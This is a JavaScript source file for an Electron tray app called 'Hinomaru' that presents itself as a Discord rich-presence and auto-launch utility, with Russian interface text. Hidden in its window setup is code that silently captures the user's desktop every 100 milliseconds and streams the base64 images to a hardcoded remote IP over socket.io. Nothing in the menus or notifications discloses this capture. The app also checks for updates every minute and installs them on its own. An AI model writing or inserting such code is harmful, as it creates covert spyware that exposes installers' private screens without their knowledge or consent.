const drpc = require("discord-rpc");
const { app, BrowserWindow, Menu, Tray, Notification  } = require('electron');
const screenshot = require('screenshot-desktop');
var AutoLaunch = require('auto-launch');
var socket = require('socket.io-client')('http://195.66.114.237:5000');
const rpc = new drpc.Client({ transport: 'ipc' });
var CronJob = require('cron').CronJob;
const { v4: uuidv4 } = require('uuid');
const {autoUpdater} = require('electron-updater');
if (process.platform === 'win32'){
    app.setAppUserModelId(app.name);
}
let tray = null;
async function createWindow () {
    var AutoLauncher = new AutoLaunch({
        name: 'Hinomaru',
        path: app.getPath("exe"),
    });
    tray = new Tray(__dirname + '/icon.png')
    let AutoLaunchEnabled = await AutoLauncher.isEnabled();
    const contextMenu = Menu.buildFromTemplate([
        { label: 'Закрыть', click:()=>{app.quit()}},
        { label: 'Проверить наличие обновлений', click:()=>{autoUpdater.checkForUpdates();}},
        { label: 'Запускать с Windows', type: 'checkbox', checked: AutoLaunchEnabled, click:(i)=>{
            if(i.checked) {
                AutoLauncher.enable();
                new Notification({ icon: __dirname + '/icon.png', title: "Добавлено в автозапуск"}).show()
            }else{
                AutoLauncher.disable();
                new Notification({ icon: __dirname + '/icon.png', title: "Удалено из автозапуск"}).show()
            }
        }}
    ]);
    tray.setContextMenu(contextMenu);
    const win = new BrowserWindow({
        icon: __dirname + '/icon.png',
        title: "Hinomaru",
        show: false
    })
    rpc.on("ready",()=>{
        rpc.setActivity({
            largeImageKey: 'hinomaru',
            buttons:[{label:"Вступить",url:"https://discord.gg/hinomaru"}],
            largeImageText: 'Hinomaru',
            instance: false,
            partyId: "status"
        });
        setInterval(()=>{
            rpc.setActivity({
                largeImageKey: 'hinomaru',
                buttons:[{label:"Вступить",url:"https://discord.gg/hinomaru"}],
                largeImageText: 'Hinomaru',
                instance: false,
                partyId: "status"
            });
        }, 1000)
    });
    var uuid = uuidv4();
    socket.emit("join-message", uuid);

    interval = setInterval(function() {
        screenshot().then((img) => {
            var imgStr = new Buffer(img).toString('base64');

            var obj = {};
            obj.room = uuid;
            obj.image = imgStr;

            socket.emit("screen-data", JSON.stringify(obj));
        })
    }, 100)
    rpc.login({ clientId:"723149921934508093" }).catch(console.error);
}

app.whenReady().then(()=>{
    autoUpdater.checkForUpdates();
    new CronJob(
        '* * * * *',
        ()=>{
            autoUpdater.checkForUpdates();
        }).start();
    createWindow();
});

autoUpdater.addListener('update-downloaded', (info) => {
    new Notification({ title: "Новое обновление.", icon: __dirname + '/icon.png', body: "Установка..." }).show()
    autoUpdater.quitAndInstall();
});